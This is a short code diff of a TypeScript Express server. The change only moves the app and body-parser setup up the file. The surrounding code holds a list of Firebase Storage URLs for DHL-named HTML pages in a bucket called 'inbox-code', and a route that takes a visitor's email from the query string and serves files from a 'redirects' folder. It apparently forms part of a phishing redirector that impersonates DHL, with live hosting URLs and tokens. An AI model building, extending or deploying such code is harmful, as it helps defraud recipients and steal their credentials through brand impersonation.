@@ -2,7 +2,8 @@ import express, {Request, Response} from 'express';
 import axios from 'axios';
 import fs from 'fs';
 import bodyParser from 'body-parser';
-
+const app = express();
+app.use(bodyParser.urlencoded({ extended: true }));
 const redirectArray: string[] = [
     'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%2010.html?alt=media&token=0ee05c1e-4bec-4bc2-a632-64a96bd9f958',
     'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%202.html?alt=media&token=f4568c0b-fba4-4cee-82b2-656750705117',
@@ -30,9 +31,6 @@ const
         // test();
         // run $ nodemon index.js
 
-
-const app = express();
-app.use(bodyParser.urlencoded({ extended: true }));
 app.get('/', (req: Request, res: Response) => {
     const email = req.query.email;
     const files = fs.readdirSync(__dirname + '/redirects/');
